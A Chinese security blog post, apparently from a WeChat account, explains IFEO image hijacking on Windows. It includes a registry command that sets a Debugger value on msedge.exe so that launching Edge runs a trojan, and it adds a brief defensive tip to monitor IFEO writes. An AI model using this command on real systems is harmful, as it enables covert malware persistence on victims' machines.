<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yF7lg2bZcbGqSNZvxiIzPQ)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

免责声明

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

IFEO

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

  
IFEO，全称是 Image File Execution Options，是 Windows 操作系统中的功能。主要用于开发人员调试程序。当指定的程序启动时，Windows 会检查注册表中的 IFEO 键，以决定是否重定向该程序，或附加一个调试器。

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

IFEO 映像劫持

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

根据 IFEO 的定义可知，当我们运行程序时，首先会去查询 IFEO 注册表，如果 IFEO 注册表中存在跟进程名称相同的子键，就会进一步获取子键中的 "debugger" 键值，如果键值不为空，系统则会把 Debugger 参数里指定的程序文件名作为用户试图启动的程序处理。

IFEO 的键值路径为：  

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9CHLKQcWiadSsTic3ctyAFpQyu4cSO2mgPAeowL6hlCtUqycOicevG4ibD6JHRV1WUcjL2CJnhHJ6o53w/640?wx_fmt=png)

*   屏幕键盘：C:\Windows\System32\osk.exe
    
*   放大镜：C:\Windows\System32\Magnify.exe
    
*   旁白：C:\Windows\System32\Narrator.exe
    
*   显示切换器 C:\Windows\System32\DisplaySwitch.exe
    
*   应用切换器：C:\Windows\System32\AtBroker.exe
    

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

复现

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

直接执行 cmd 写入注册表，劫持 edge 浏览器：  

```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v "Debugger" /t REG_SZ /d "C:\Users\fatmo\Desktop\shell.exe" /f

```

然后当目标打开 edge 浏览器时，木马就会上线：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/FVvAFkxoh9CHLKQcWiadSsTic3ctyAFpQy22cOQAEZDoEe3UwEepUdg3RRl1CI9QMRyGTYlUHO8Diab1IdviaibKBJw/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Op7Y2S0HyKx4Sibx9mxsrz68yfgLOMCxU05FFBGZtaHqGlp9uPhdwKhs0vLnxgibBpLrwfGhQVWpIHdjxlfhDyLg/640?wx_fmt=png)

防范

![](https://mmbiz.qpic.cn/mmbiz_png/yRDp2K3ZBpKOicaBvhSTPZYqTVq8ku50NMtfAqkWhJw2cyMfYEhzIZHlVGLH0Wl2tQ8usSOv6xbZxBiabe1XiaLhA/640?wx_fmt=png)

  

监听注册表 IFEO 键的写入操作。